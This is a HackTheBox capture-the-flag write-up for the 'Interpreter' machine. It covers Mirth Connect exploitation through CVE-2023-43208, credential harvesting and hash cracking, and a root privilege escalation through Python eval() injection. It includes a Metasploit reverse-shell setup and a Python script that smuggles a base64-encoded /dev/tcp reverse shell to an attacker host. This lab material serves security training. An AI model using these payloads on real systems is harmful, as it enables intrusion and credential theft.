# HackTheBox — Interpreter

**Difficulty:** Medium  
**OS:** Linux (Debian 12)  
**Platform:** HackTheBox  

---

## Overview

Mirth Connect 4.4.0 is exposed over HTTP/HTTPS. Unauthenticated RCE via a Java deserialization vulnerability (CVE-2023-43208) gives an initial shell as `mirth`. Credentials harvested from a plaintext config file lead to a local MySQL database containing a PBKDF2 password hash. Cracking the hash gives SSH access and the user flag. Root is obtained by exploiting an unvalidated `eval()` call inside a Python service running as root, reachable via an internal Mirth Connect channel.

---

## 1. Enumeration

```bash
nmap -sV -sC <TARGET_IP> -Pn
```

**Open ports:**
- `22/tcp` — OpenSSH 9.2p1 (Debian)
- `80/tcp` — Jetty (Mirth Connect)
- `443/tcp` — Jetty SSL (Mirth Connect)

### Version Fingerprinting

Mirth Connect's REST API requires the `X-Requested-With` header:

```bash
curl -sk https://<TARGET_IP>/api/server/version -H "X-Requested-With: XMLHttpRequest"
# Returns: 4.4.0
```

Mirth Connect 4.4.0 is vulnerable to **CVE-2023-43208**.

---

## 2. Initial Foothold — CVE-2023-43208

CVE-2023-43208 is an unauthenticated Java deserialization RCE in Mirth Connect's REST API (bypass of the partial patch for CVE-2023-37679).

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS <TARGET_IP>
set RPORT 443
set LHOST <ATTACKER_IP>
set FETCH_WRITABLE_DIR /tmp
set payload cmd/unix/reverse_bash
exploit
```

**Result:** Shell as `mirth`.

---

## 3. Credential Harvesting

### Mirth Config File

```bash
find / -name "mirth.properties" 2>/dev/null
cat /usr/local/mirthconnect/conf/mirth.properties
```

Database credentials found in plaintext.

### MySQL Enumeration

```bash
mysql -u <db_user> -p'<db_pass>' mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
-- Local user account found

SELECT * FROM PERSON_PASSWORD;
-- PBKDF2 hash recovered

SELECT * FROM CHANNEL\G
-- HL7 channel on port 6661 forwards XML to http://127.0.0.1:54321/addPatient
-- Uses ${message.encodedData} — user-controlled input
```

---

## 4. User Flag

Cracked the PBKDF2 hash (hashcat mode 10900) with rockyou.txt:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

SSH'd in as the local user → `user.txt` retrieved.

---

## 5. Privilege Escalation — Python eval() Injection

```bash
ps aux | grep notif
# root  /usr/bin/python3 /usr/local/bin/notif.py
```

`notif.py` runs as **root** and listens on `127.0.0.1:54321/addPatient`. It processes incoming XML and passes the `firstname` field directly into Python's `eval()` with no sanitisation.

The Mirth Connect HL7 channel forwards user-controlled XML to this endpoint — full injection path from the `mirth` shell.

### Exploit

```python
import urllib.request, base64
from urllib.request import Request

shell = "bash -i >& /dev/tcp/<ATTACKER_IP>/9004 0>&1"
b64 = base64.b64encode(shell.encode()).decode()
inj = f"{{exec(__import__('base64').b64decode('{b64}').decode())}}"
xml = f"<patient><firstname>{inj}</firstname></patient>"

req = Request("http://127.0.0.1:54321/addPatient", data=xml.encode())
urllib.request.urlopen(req)
```

With `nc -lvnp 9004` running on the attacker machine, executing this from the mirth shell returns a **root shell**.

---

## Flags

- **User:** `/home/<user>/user.txt`
- **Root:** `/root/root.txt`

---

## Key Takeaways

- Healthcare software (Mirth Connect, etc.) is increasingly targeted — always fingerprint versions and check for known CVEs.
- Mirth Connect stores database credentials in plaintext in `mirth.properties` — first place to look post-foothold.
- Pull both `PERSON` and `PERSON_PASSWORD` tables — hashcat mode `10900` for PBKDF2-HMAC-SHA256.
- Any root process consuming user-controlled input and passing it to `eval()` or `exec()` is game over. Always enumerate internal services with `ps aux`.
